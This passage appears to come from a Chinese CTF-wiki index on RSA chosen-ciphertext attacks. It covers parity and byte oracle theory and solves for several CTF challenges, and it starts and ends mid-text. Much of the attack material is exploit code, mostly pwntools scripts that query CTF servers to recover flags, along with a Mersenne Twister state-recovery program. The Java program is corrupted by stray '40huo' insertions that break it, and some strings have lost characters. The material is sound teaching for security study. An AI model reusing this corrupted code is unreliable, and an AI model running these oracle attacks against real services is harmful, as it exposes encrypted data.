int.from_bytes(ciphertext, 'big'),\n      private_key.private_numbers().d,\n      private_key.public_key().public_numbers().n)\n\n\ndef Challenge(private_key, reader, writer):\n  try:\n    m0 = reader.read(1)\n    m1 = reader.read(1)\n    ciphertext = reader.read(private_key.public_key().key_size // 8)\n    dice = RsaDecrypt(private_key, ciphertext)\n    for rounds in range(100):\n      p = [m0, m1][dice &amp; 1]\n      k = random.randint(0, 2)\n      c = (ord(p) + k) % 2\n      writer.write(bytes((c,)))\n    writer.flush()\n    return 0\n\n  except Exception as e:\n    return 1\n\n\ndef main():\n  private_key = ReadPrivateKey(sys.argv[1])\n  return Challenge(private_key, sys.stdin.buffer, sys.stdout.buffer)\n\n\nif __name__ == '__main__':\n  sys.exit(main())\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa</p> <ul> <li>\u6211\u4eec\u53ef\u4ee5\u7ed9\u670d\u52a1\u5668\u4e24\u4e2a\u6570\uff0c\u670d\u52a1\u5668\u4f1a\u6839\u636e\u89e3\u5bc6\u540e\u7684\u5bc6\u6587\u5185\u5bb9\u6765\u51b3\u5b9a\u4f7f\u7528\u54ea\u4e00\u4e2a\u3002</li> <li>\u670d\u52a1\u5668\u4f1a\u4f7f\u7528 <code>random.randint(0, 2)</code> \u6765\u751f\u6210\u968f\u673a\u6570\uff0c\u5e76\u8f93\u51fa\u76f8\u5173\u7684\u968f\u673a 01 \u5b57\u8282 c\u3002</li> </ul> <p>\u4e4d\u4e00\u770b\uff0c\u4f3c\u4e4e\u662f\u5b8c\u5168\u968f\u673a\u7684\uff0c\u4ed4\u7ec6\u67e5\u4e00\u4e0b <code>random.randint(0, 2)</code> \u53ef\u4ee5\u77e5\u9053\u5176\u751f\u6210\u968f\u673a\u6570\u662f\u5305\u62ec\u8fb9\u754c\u7684\uff0c\u56e0\u6b64\u5176\u751f\u6210\u5076\u6570\u7684\u6982\u7387\u5927\u4e8e\u751f\u6210\u5947\u6570\u7684\u6982\u7387\uff0c\u90a3\u4e48 c \u4e0e p \u540c\u5947\u5076\u7684\u6982\u7387\u4e3a \u2154\u3002\u8fdb\u800c\u6211\u4eec\u901a\u8fc7\u8bbe\u7f6e m0 \u548c m1 \u5c31\u53ef\u4ee5\u77e5\u9053\u89e3\u5bc6\u540e\u7684\u5bc6\u6587\u7684\u6700\u540e\u4e00\u4f4d\u662f 0 \u8fd8\u662f 1 \u3002\u8fd9\u5176\u5b9e\u5c31\u662f RSA parity oracle\u3002</p> <p>exp \u5982\u4e0b</p> <pre><code>import gmpy2\nfrom pwn import *\nencflag = open('./flag.txt').read()\nencflag = encflag.encode('hex')\nencflag = int(encflag, 16)\n#context.log_level = 'debug'\nm = ['\\x00', '\\x07']\nn = 0xDA53A899D5573091AF6CC9C9A9FC315F76402C8970BBB1986BFE8E29CED12D0ADF61B21D6C281CCBF2EFED79AA7DD23A2776B03503B1AF354E35BF58C91DB7D7C62F6B92C918C90B68859C77CAE9FDB314F82490A0D6B50C5DC85F5C92A6FDF19716AC8451EFE8BBDF488AE098A7C76ADD2599F2CA642073AFA20D143AF403D1\ne = 65537\nflag = \"\"\n\n\n\ndef guessvalue(cnt):\n    if cnt[0] &gt; cnt[1]:\n        return 0\n    return 1\n\n\ni = 0\nwhile True:\n    cnt = dict()\n    cnt[0] = cnt[1] = 0\n    p = remote('perfect-secrecy.ctfcompetition.com', 1337)\n    p.send(m[0])\n    p.send(m[1])\n    tmp = pow(2, i)\n    two_inv = gmpy2.invert(tmp, n)\n    two_cipher = gmpy2.powmod(two_inv, e, n)\n    tmp = encflag * two_cipher % n\n    tmp = hex(tmp)[2:].strip('L')\n    tmp = '0' * (256 - len(tmp)) + tmp\n    tmp = tmp.decode('hex')\n    assert (len(tmp) == 128)\n    p.send(tmp)\n    #print tmp\n    data = \"\"\n    while (len(data) != 100):\n        data += p.recv()\n    for c in data:\n        cnt[u8(c)] += 1\n    p.close()\n    flag = str(guessvalue(cnt)) + flag\n    print i, flag\n    i += 1\n</code></pre> <p>\u7ed3\u679c\u5982\u4e0b</p> <pre><code>6533021797450432625003726192285181680054061843303961161444459679874621880787893445342698029728203298974356255732086344166897556918532195998159983477294838449903429031335408290610431938507208444225296242342845578895553611385588996615744823221415296689514934439749745119968629875229882861818946483594948270 6533021797450432625003726192285181680054061843303961161444459679874621880787893445342698029728203298974356255732086344166897556918532195998159983477294838449903429031335408290610431938507208444225296242342845578895553611385588996615744823221415296689514934439749745119968629875229882861818946483594948270\n</code></pre> <p>\u89e3\u7801\u540e\u5c31\u53ef\u4ee5\u5f97\u5230 flag</p> <pre><code>CTF{h3ll0__17_5_m3_1_w45_w0nd3r1n6_1f_4f73r_4ll_7h353_y34r5_y0u_d_l1k3_70_m337}\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_4","title":"\u9898\u76ee","text":"<ul> <li>2016 Plaid CTF rabit</li> <li>2016 sharif CTF lsb-oracle-150</li> <li>2018 Backdoor CTF  BIT-LEAKER</li> <li>2018 XMAN \u9009\u62d4\u8d5b baby RSA</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#rsa-byte-oracle","title":"RSA Byte Oracle","text":"<p>\u5047\u8bbe\u76ee\u524d\u5b58\u5728\u4e00\u4e2a Oracle\uff0c\u5b83\u4f1a\u5bf9\u4e00\u4e2a\u7ed9\u5b9a\u7684\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u4e14\u4f1a\u7ed9\u51fa\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u90a3\u4e48\u7ed9\u5b9a\u4e00\u4e2a\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\uff0c\u6211\u4eec\u53ea\u9700\u8981 \\log_{256}n \u6b21\u5c31\u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\u6d88\u606f\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_5","title":"\u539f\u7406","text":"<p>\u8fd9\u4e2a\u5176\u5b9e\u7b97\u4f5c RSA parity Oracle \u7684\u6269\u5c55\uff0c\u65e2\u7136\u53ef\u4ee5\u6cc4\u9732\u51fa\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u90a3\u4e48\u6309\u9053\u7406\u6211\u4eec\u83b7\u53d6\u5bc6\u6587\u5bf9\u5e94\u660e\u6587\u7684\u6b21\u6570\u5e94\u8be5\u53ef\u4ee5\u51cf\u5c11\u3002</p> <p>\u5047\u8bbe</p> <p>C=P^e \\bmod N</p> <p>\u7b2c\u4e00\u6b21\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed9\u670d\u52a1\u5668\u53d1\u9001</p> <p>C*256^e=(256P)^e \\bmod N</p> <p>\u670d\u52a1\u5668\u4f1a\u8ba1\u7b97\u5f97\u5230</p> <p>256P \\bmod N</p> <p>\u8fd9\u91cc</p> <ul> <li>256P \u662f\u5076\u6570\u3002</li> <li>N \u662f\u5947\u6570\uff0c\u56e0\u4e3a\u5b83\u662f\u7531\u4e24\u4e2a\u5927\u7d20\u6570\u76f8\u4e58\u5f97\u5230\u3002</li> </ul> <p>\u7531\u4e8e P \u4e00\u822c\u662f\u5c0f\u4e8e N \u7684\uff0c\u90a3\u4e48256P \\bmod N=256P-kn, k&lt;256\u3002\u800c\u4e14\u5bf9\u4e8e\u4e24\u4e2a\u4e0d\u540c\u7684 k_1,k_2\uff0c\u6211\u4eec\u6709</p> <p>256P-k_1n \\not\\equiv 256P-k_2n \\bmod 256</p> <p>\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u53cd\u8bc1\u6cd5\u6765\u8bc1\u660e\u4e0a\u8ff0\u4e0d\u7b49\u5f0f\u3002\u540c\u65f6 256P-kn \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5176\u5b9e\u5c31\u662f -kn \u5728\u6a21 256 \u7684\u60c5\u51b5\u4e0b\u83b7\u53d6\u7684\u3002\u90a3\u4e48\uff0c\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u9996\u5148\u679a\u4e3e\u51fa 0~255 \u60c5\u51b5\u4e0b\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u6784\u9020\u4e00\u4e2a k \u548c\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u6620\u5c04\u8868 map</p> <p>\u5f53\u670d\u52a1\u5668\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u5b57\u8282 b\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e0a\u8ff0\u6784\u9020\u7684\u6620\u5c04\u8868\u5f97\u77e5 k\uff0c\u5373\u51cf\u53bb\u4e86 k \u4e2aN\uff0c \u5373 kN \\leq 256 P \\leq (k+1)N\u3002</p> <p>\u6b64\u540e\uff0c\u6211\u4eec\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\u6765\u83b7\u53d6 P \u7684\u8303\u56f4\uff0c\u5373\u5047\u8bbe\u5728\u7b2c i \u6b21\u65f6\uff0c\\frac{xN}{256^{i}} \\leq P &lt; \\frac{xN+N}{256^{i}}</p> <p>\u8fdb\u4e00\u6b65\uff0c\u5728\u7b2c i+1 \u6b21\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u9001</p> <p>C*256^{(i+1)e}</p> <p>\u670d\u52a1\u5668\u4f1a\u8ba1\u7b97\u5f97\u5230</p> <p>256^{i+1}P \\bmod N=256^{i+1}P-kN</p> <p>0 \\leq 256^{i+1}P-kN&lt;N </p> <p>\\frac{kN}{256^{i+1}} \\leq P &lt; \\frac{kN+N}{256^{i+1}}</p> <p>\u6839\u636e\u7b2c i \u6b21\u7684\u7ed3\u679c</p> <p>\\frac{256xN}{256^{i+1}} \\leq P &lt; \\frac{256xN+256N}{256^{i+1}}</p> <p>\u6211\u4eec\u8fd9\u91cc\u53ef\u4ee5\u5047\u8bbe k=256y+t\uff0c \u800c\u8fd9\u91cc\u7684 t \u5c31\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6620\u5c04\u8868\u83b7\u53d6\u7684\u3002</p> <p>\\frac{256yN+tN}{256^{i+1}} \\leq P &lt; \\frac{256yN+(t+1)N}{256^{i+1}}</p> <p>\u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8e P \u5fc5\u7136\u5b58\u5728\uff0c\u6240\u4ee5\u7b2c i+1 \u5f97\u5230\u7684\u8fd9\u4e2a\u8303\u56f4\u548c\u7b2c i \u6b21\u5f97\u5230\u7684\u8303\u56f4\u5fc5\u7136\u5b58\u5728\u4ea4\u96c6\u3002</p> <p>\u6240\u4ee5 y \u5fc5\u7136\u4e0e x \u76f8\u7b49\u3002</p> <p>\u8fdb\u4e00\u6b65\u6211\u4eec\u53ef\u4ee5\u8fd9\u4e48\u5f52\u7eb3\uff0c\u521d\u59cb\u60c5\u51b5\u4e0b</p> <pre><code>lb = 0\nub = N\n</code></pre> <p>\u5047\u8bbe\u670d\u52a1\u5668\u8fd4\u56de\u4e86 b\uff0c\u90a3\u4e48</p> <pre><code>k = mab[b]\ninterval = (ub-lb)/256\nlb = lb + interval * k\nub = lb + interval\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#2018-hitcon-lost-key","title":"2018 HITCON lost key","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u7efc\u5408\u9898\u76ee\uff0c\u9996\u5148\u6ca1\u6709\u7ed9\u51fa n\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9009\u62e9\u660e\u6587\u653b\u51fb\u7684\u65b9\u5f0f\u83b7\u53d6 n\uff0c\u5f53\u7136\u6211\u4eec\u4e5f\u53ef\u4ee5\u8fdb\u4e00\u6b65\u83b7\u53d6 e\uff0c\u6700\u540e\u5229\u7528\u4ee3\u7801\u5982\u4e0b</p> <pre><code>from pwn import *\nimport gmpy2\nfrom fractions import Fraction\np = process('./rsa.py')\n#p = remote('18.179.251.168', 21700)\n#context.log_level = 'debug'\np.recvuntil('Here is the flag!\\n')\nflagcipher = int(p.recvuntil('\\n', drop=True), 16)\n\n\ndef long_to_hex(n):\n    s = hex(n)[2:].rstrip('L')\n    if len(s) % 2: s = '0' + s\n    return s\n\n\ndef send(ch, num):\n    p.sendlineafter('cmd: ', ch)\n    p.sendlineafter('input: ', long_to_hex(num))\n    data = p.recvuntil('\\n')\n    return int(data, 16)\n\n\nif __name__ == \"__main__\":\n    # get n\n    cipher2 = send('A', 2)\n    cipher4 = send('A', 4)\n    nset = []\n    nset.append(cipher2 * cipher2 - cipher4)\n\n    cipher3 = send('A', 3)\n    cipher9 = send('A', 9)\n    nset.append(cipher3 * cipher3 - cipher9)\n    cipher5 = send('A', 5)\n    cipher25 = send('A', 25)\n    nset.append(cipher5 * cipher5 - cipher25)\n    n = nset[0]\n    for item in nset:\n        n = gmpy2.gcd(item, n)\n\n    # get map between k and return byte\n    submap = {}\n    for i in range(0, 256):\n        submap[-n * i % 256] = i\n\n    # get cipher256\n    cipher256 = send('A', 256)\n\n    back = flagcipher\n\n    L = Fraction(0, 1)\n    R = Fraction(1, 1)\n    for i in range(128):\n        print i\n        flagcipher = flagcipher * cipher256 % n\n        b = send('B', flagcipher)\n        k = submap[b]\n        L, R = L + (R - L) * Fraction(k, 256\n                                     ), L + (R - L) * Fraction(k + 1, 256)\n    low = int(L * n)\n    print long_to_hex(low - low % 256 + send('B', back)).decode('hex')\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#rsa-parity-oracle-variant","title":"RSA parity oracle variant","text":""},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_6","title":"\u539f\u7406","text":"<p>\u5982\u679coracle\u7684\u53c2\u6570\u4f1a\u5728\u4e00\u5b9a\u65f6\u95f4\u3001\u8fd0\u884c\u5468\u671f\u540e\u6539\u53d8\uff0c\u6216\u8005\u7f51\u7edc\u4e0d\u7a33\u5b9a\u5bfc\u81f4\u4f1a\u8bdd\u65ad\u5f00\u3001\u91cd\u7f6e\uff0c\u4e8c\u5206\u6cd5\u5c31\u4e0d\u518d\u9002\u7528\u4e86\uff0c\u4e3a\u4e86\u51cf\u5c11\u9519\u8bef\uff0c\u5e94\u5f53\u8003\u8651\u9010\u4f4d\u6062\u590d\u3002 \u8981\u6062\u590d\u660e\u6587\u7684\u7b2c2\u4f4e\u4f4d\uff0c\u8003\u8651</p> \\{(c(2^{-1*e_1}\\mod N_1))^{d_1}\\mod N_1\\}\\pmod2\\equiv m*2^{-1}  \\begin{aligned} &amp;m*(2^{-1}\\mod N_1)\\mod2\\\\ &amp;=(\\displaystyle\\sum_{i=0}^{logm-1}a_i*2^i)*2^{-1}\\mod2\\\\ &amp;=[2(\\displaystyle\\sum_{i=1}^{logm-1}a_i*2^{i-1})+a_0*2^0]*2^{-1}\\mod 2\\\\ &amp;=\\displaystyle\\sum_{i=1}^{logm-1}a_i*2^{i-1}+a_0*2^0*2^{-1}\\mod2\\\\ &amp;\\equiv a_1+a_0*2^0*2^{-1}\\equiv y\\pmod2 \\end{aligned}   y-(a_0*2^0)*2^{-1}=(m*2^{-1}\\mod2)-(a_0*2^0)*2^{-1}\\equiv a_1\\pmod2  <p>\u7c7b\u4f3c\u7684</p> \\{(c(2^{-2*e_2}\\mod N_2))^{d_2}\\mod N_2\\}\\pmod2\\equiv m*2^{-2}  \\begin{aligned} &amp;m*(2^{-2}\\mod N_2)\\mod2\\\\ &amp;=(\\displaystyle\\sum_{i=0}^{logm-1}a_i*2^i)*2^{-2}\\mod2\\\\ &amp;=[2^2(\\displaystyle\\sum_{i=2}^{logm-1}a_i*2^{i-2})+a_1*2^1+a_0*2^0]*2^{-2}\\mod 2\\\\ &amp;=\\displaystyle\\sum_{i=2}^{logm-1}a_i*2^{i-1}+(a_1*2^1+a_0*2^0)*2^{-2}\\mod2\\\\ &amp;\\equiv a_2+(a_1*2^1+a_0*2^0)*2^{-2}\\equiv y\\pmod2 \\end{aligned}   \\begin{aligned}     &amp;y-(a_1*2^1+a_0*2^0)*2^{-2}\\\\     &amp;=(m*2^{-2}\\mod2)-(a_1*2^1+a_0*2^0)*2^{-2}\\equiv a_2\\pmod2 \\end{aligned}  <p>\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528\u524di-1\u4f4d\u4e0eoracle\u7684\u7ed3\u679c\u6765\u5f97\u5230\u7b2ci\u4f4d\u3002\u6ce8\u610f\u8fd9\u91cc\u76842^{-1}\u662f2^1\u6a21N_1\u7684\u9006\u5143\u3002\u6240\u4ee5\u5bf9\u5269\u4e0b\u7684\u4f4d\uff0c\u6709</p>  \\begin{aligned}     &amp;\\{(c(2^{-i*e_i}\\mod N_i))^{d_i}\\mod N_i\\}\\pmod2\\equiv m*2^{-i}\\\\     &amp;a_i\\equiv (m*2^{-i}\\mod2) -\\sum_{j=0}^{i-1}a_j*2^j\\pmod2,i=1,2,...,logm-1 \\end{aligned}  <p>\u5176\u4e2d2^{-i}\u662f2^i\u6a21N_i\u7684\u9006\u5143\u3002</p> <p>\u5c31\u53ef\u4ee5\u9010\u6b65\u6062\u590d\u539f\u6587\u6240\u6709\u7684\u4f4d\u4fe1\u606f\u4e86\u3002\u8fd9\u6837\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(logm)\u3002</p> <p>exp: <pre><code>from Crypto.Util.number import *\nmm = bytes_to_long(b'12345678')\nl = len(bin(mm)) - 2\n\ndef genkey():\n    while 1:\n        p = getPrime(128)\n        q = getPrime(128)\n        e = getPrime(32)\n        n = p * q\n        phi = (p - 1) * (q - 1)\n        if GCD(e, phi) &gt; 1:\n            continue\n        d = inverse(e, phi)\n        return e, d, n\n\ne, d, n = genkey()\ncc = pow(mm, e, n)\nf = str(pow(cc, d, n) % 2)\n\nfor i in range(1, l):\n    e, d, n = genkey()\n    cc = pow(mm, e, n)\n    ss = inverse(2**i, n)\n    cs = (cc * pow(ss, e, n)) % n\n    lb = pow(cs, d, n) % 2\n    bb = (lb - (int(f, 2) * ss % n)) % 2\n    f = str(bb) + f\n    assert(((mm &gt;&gt; i) % 2) == bb)\nprint(long_to_bytes(int(f, 2)))\n</code></pre></p>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_7","title":"\u53c2\u8003","text":"<ul> <li>https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack</li> <li>https://pastebin.com/KnEUSMxp</li> <li>https://github.com/ashutosh1206/Crypton</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_complex/","title":"RSA \u590d\u6742\u9898\u76ee","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#2018-tokyo-western-mixed-cipher","title":"2018 Tokyo Western Mixed Cipher","text":"<p>\u9898\u76ee\u7ed9\u7684\u4fe1\u606f\u5982\u4e0b\u6240\u793a\uff1a</p> <ul> <li>\u6bcf\u6b21\u4ea4\u4e92\u53ef\u4ee5\u7ef4\u6301\u7684\u65f6\u95f4\u957f\u5ea6\u7ea6\u4e3a 5 \u5206\u949f</li> <li>\u6bcf\u6b21\u4ea4\u4e92\u4e2d\u4e2dn\u662f\u786e\u5b9a\u7684 1024 bit\uff0c\u4f46\u662f\u672a\u77e5\uff0c e \u4e3a 65537</li> <li>\u4f7f\u7528 aes \u52a0\u5bc6\u4e86 flag\uff0c\u5bc6\u94a5\u548c IV \u5747\u4e0d\u77e5\u9053</li> <li>\u6bcf\u6b21\u5bc6\u94a5\u662f\u56fa\u5b9a\u7684\uff0c\u4f46\u662f IV \u6bcf\u6b21\u90fd\u4f1a\u968f\u673a</li> <li>\u53ef\u4ee5\u4f7f\u7528 encrypt \u529f\u80fd\u968f\u610f\u4f7f\u7528 rsa \u548c aes \u8fdb\u884c\u52a0\u5bc6\uff0c\u5176\u4e2d\u6bcf\u6b21\u52a0\u5bc6\u90fd\u4f1a\u5bf9 aes \u7684 iv \u8fdb\u884c\u968f\u673a</li> <li>\u53ef\u4ee5\u4f7f\u7528 decrypt \u5bf9\u968f\u610f\u7684\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u4f46\u662f\u53ea\u80fd\u77e5\u9053\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u662f\u4ec0\u4e48</li> <li>\u53ef\u4ee5\u4f7f\u7528 print_flag \u83b7\u53d6 flag \u5bc6\u6587</li> <li>\u53ef\u4ee5\u4f7f\u7528 print_key \u83b7\u53d6 rsa \u52a0\u5bc6\u7684 aes \u5bc6\u94a5</li> </ul> <p>\u672c\u9898\u76ee\u770b\u4f3c\u4e00\u4e2a\u9898\u76ee\uff0c\u5b9e\u5219\u662f 3 \u4e2a\u9898\u76ee\uff0c\u9700\u8981\u5206\u6b65\u9aa4\u89e3\u51b3\u3002\u5728\u6b64\u4e4b\u524d\uff0c\u6211\u5011\u6e96\u5099\u597d\u4ea4\u4e92\u7684\u51fd\u6578</p> <pre><code>def get_enc_key(io):\n    io.read_until(\"4: get encrypted keyn\")\n    io.writeline(\"4\")\n    io.read_until(\"here is encrypted key :)n\")\n    c=int(io.readline()[:-1],16)\n    return c\n\ndef encrypt_io(io,p):\n    io.read_until(\"4: get encrypted keyn\")\n    io.writeline(\"1\")\n    io.read_until(\"input plain text: \")\n    io.writeline(p)\n    io.read_until(\"RSA: \")\n    rsa_c=int(io.readline()[:-1],16)\n    io.read_until(\"AES: \")\n    aes_c=io.readline()[:-1].decode(\"hex\")\n    return rsa_c,aes_c\n\ndef decrypt_io(io,c):\n    io.read_until(\"4: get encrypted keyn\")\n    io.writeline(\"2\")\n    io.read_until(\"input hexencoded cipher text: \")\n    io.writeline(long_to_bytes(c).encode(\"hex\"))\n    io.read_until(\"RSA: \")\n    return io.read_line()[:-1].decode(\"hex\")\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#gcd-attack-n","title":"GCD attack n","text":"<p>\u7b2c\u4e00\u6b65\u6211\u4eec\u9700\u8981\u628a\u6ca1\u6709\u7ed9\u51fa\u7684 n \u7b97\u51fa\u6765\uff0c\u56e0\u4e3a\u6211\u4eec\u53ef\u4ee5\u5229\u7528 encrypt \u529f\u80fd\u5bf9\u6211\u4eec\u8f93\u5165\u7684\u660e\u6587 x \u8fdb\u884c rsa \u52a0\u5bc6\uff0c\u90a3\u4e48\u53ef\u4ee5\u5229\u7528\u6574\u9664\u7684\u6027\u8d28\u7b97 n</p> <p><pre><code>\u56e0\u4e3ax ^ e = c mod n\n\u6240\u4ee5 n | x ^ e - c\n</code></pre> \u6211\u4eec\u53ef\u4ee5\u6784\u9020\u8db3\u591f\u591a\u7684 x\uff0c\u7b97\u51fa\u6700\u591f\u591a\u7684 x ^ e - c\uff0c\u4ece\u800c\u8ba1\u7b97\u6700\u5927\u516c\u7ea6\u6570\uff0c\u5f97\u5230 n\u3002</p> <pre><code>def get_n(io):\n    rsa_c,aes_c=encrypt_io(io,long_to_bytes(2))\n    n=pow(2,65537)-rsa_c\n    for i in range(3,6):\n        rsa_c, aes_c = encrypt_io(io, long_to_bytes(i))\n        n=primefac.gcd(n,pow(i,65537)-rsa_c)\n    return n\n</code></pre> <p>\u53ef\u4ee5\u5229\u7528\u52a0\u5bc6\u8fdb\u884c check</p> <pre><code>def check_n(io,n):\n    rsa_c, aes_c = encrypt_io(io, \"123\")\n    if pow(bytes_to_long(\"123\"), e, n)==rsa_c:\n        return True\n    else:\n        return False\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#rsa-parity-oracle","title":"RSA parity oracle","text":"<p>\u5229\u7528 leak \u7684\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u9009\u62e9\u5bc6\u6587\u653b\u51fb\uff0c\u4f7f\u7528 RSA parity oracle \u56de\u590d aes \u7684\u79d8\u94a5</p> <pre><code>def guess_m(io,n,c):\n    k=1\n    lb=0\n    ub=n\n    while ub!=lb:\n        print lb,ub\n        tmp = c * gmpy2.powmod(2, k*e, n) % n\n        if ord(decrypt_io(io,tmp)[-1])%2==1:\n            lb = (lb + ub) / 2\n        else:\n            ub = (lb + ub) / 2\n        k+=1\n    print ub,len(long_to_bytes(ub))\n    return ub\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#prng-predict","title":"PRNG Predict","text":"<p>\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u89e3\u5bc6 flag \u768416\u5b57\u8282\u4e4b\u540e\u7684\u5185\u5bb9\u4e86\uff0c\u4f46\u662f\u524d16\u4e2a\u5b57\u8282\u6ca1\u6709 IV \u662f\u89e3\u5bc6\u4e0d\u4e86\u7684\u3002\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0cIV \u751f\u6210\u4f7f\u7528\u7684\u968f\u673a\u6570\u4f7f\u7528\u4e86 getrandbits\uff0c\u5e76\u4e14\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u5230\u8db3\u591f\u591a\u7684\u968f\u673a\u6570\u91cf\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c PRNG \u7684 predict\uff0c\u4ece\u800c\u76f4\u63a5\u83b7\u53d6\u968f\u673a\u6570</p> <p>\u8fd9\u91cc\u4f7f\u7528\u4e86\u4e00\u4e2a\u73b0\u6210\u7684\u7684 java \u8fdb\u884c PRNG \u7684 Predict</p> <pre><code>public class Main {\n\nstatic int[] state;\nstatic int currentIndex;\n40huo\npublic static void main(String[] args) {\nstate = new int[624];\ncurrentIndex = 0;\n\n//    initialize(0);\n\n//    for (int i = 0; i &lt; 5; i++) {\n//       System.out.println(state[i]);\n//    }\n\n// for (int i = 0; i &lt; 5; i++) {\n// System.out.println(nextNumber());\n// }\n\nif (args.length != 624) {\nSystem.err.println(\"must be 624 args\");\nSystem.exit(1);\n}\nint[] arr = new int[624];\nfor (int i = 0; i &lt; args.length; i++) {\narr[i] = Integer.parseInt(args[i]);\n}\n\n\nrev(arr);\n\nfor (int i = 0; i &lt; 6240huo4; i++) {\nSystem.out.println(state[i]);\n}\n\n//    System.out.println(\"currentIndex \" + currentIndex);\n//    System.out.println(\"state[currentIndex] \" + state[currentIndex]);\n//    System.out.println(\"next \" + nextNumber());\n\n// want -2065863258\n}\n\nstatic void nextState() {\n// Iterate through the state\nfor (int i = 0; i &lt; 624; i++) {\n// y is the first bit of the current number,\n// and the last 31 bits of the next number\nint y = (state[i] &amp; 0x80000000)\n+ (state[(i + 1) % 624] &amp; 0x7fffffff);\n// first bitshift y by 1 to the right\nint next = y &gt;&gt;&gt; 1;\n// xor it with the 397th next number\nnext ^= state[(i + 397) % 624];\n// if y is odd, xor with magic number\nif ((y &amp; 1L) == 1L) {\nnext ^= 0x9908b0df;\n}\n// now we have the result\nstate[i] = next;\n}\n}\n\nstatic int nextNumber() {\ncurrentIndex++;\nint tmp = state[currentIndex];\ntmp ^= (tmp &gt;&gt;&gt; 11);\ntmp ^= (tmp &lt;&lt; 7) &amp; 0x9d2c5680;\ntmp ^= (tmp &lt;&lt; 15) &amp; 0xefc60000;\ntmp ^= (tmp &gt;&gt;&gt; 18);\nreturn tmp;\n}\n\nstatic void initialize(int seed) {\n\n// http://code.activestate.com/recipes/578056-mersenne-twister/\n\n// global MT\n// global bitmask_1\n// MT[0] = seed\n// for i in xrange(1,624):\n// MT[i] = ((1812433253 * MT[i-1]) ^ ((MT[i-1] &gt;&gt; 30) + i)) &amp; bitmask_1\n\n// copied Python 2.7's impl (probably uint problems)\nstate[0] = seed;\nfor (int i = 1; i &lt; 624; i++) {\nstate[i] = ((1812433253 * state[i - 1]) ^ ((state[i - 1] &gt;&gt; 30) + i)) &amp; 0xffffffff;\n}\n}\n\nstatic int unBitshiftRightXor(int value, int shift) {\n// we part of the value we are up to (with a width of shift bits)\nint i = 0;\n// we accumulate the result here\nint result = 0;\n// iterate until we've done the full 32 bits\nwhile (i * shift &lt; 32) {\n// create a mask for this part\nint partMask = (-1 &lt;&lt; (32 - shift)) &gt;&gt;&gt; (shift * i);\n// obtain the part\nint part = value &amp; partMask;\n// unapply the xor from the next part of the integer\nvalue ^= part &gt;&gt;&gt; shift;\n// add the part to the result\nresult |= part;\ni++;\n}\nreturn result;\n}\n\nstatic int unBitshiftLeftXor(int value, int shift, int mask) {\n// we part of the value we are up to (with a width of shift bits)\nint i = 0;\n// we accumulate the result here\nint result = 0;\n// iterate until we've done the full 32 bits\nwhile (i * shift &lt; 32) {\n// create a mask for this part\nint partMask = (-1 &gt;&gt;&gt; (32 - shift)) &lt;&lt; (shift * i);\n// obtain the part\nint part = value &amp; partMask;\n// unapply the xor from the next part of the integer\nvalue ^= (part &lt;&lt; shift) &amp; mask;\n// add the part to the result\nresult |= part;\ni++;\n}\nreturn result;\n}\n\nstatic void rev(int[] nums) {\nfor (int i = 0; i &lt; 624; i++) {\n\nint value = nums[i];\nvalue = unBitshiftRightXor(value, 18);\nvalue = unBitshiftLeftXor(value, 15, 0xefc60000);\nvalue = unBitshiftLeftXor(value, 7, 0x9d2c5680);\nvalue = unBitshiftRightXor(value, 11);\n\nstate[i] = value;\n}\n}\n}\n</code></pre> <p>\u5199\u4e86\u4e00\u4e2a python \u76f4\u63a5\u8c03\u7528 java</p> <pre><code>from Crypto.Util.number import long_to_bytes,bytes_to_long\n\n\n\ndef encrypt_io(io,p):\n    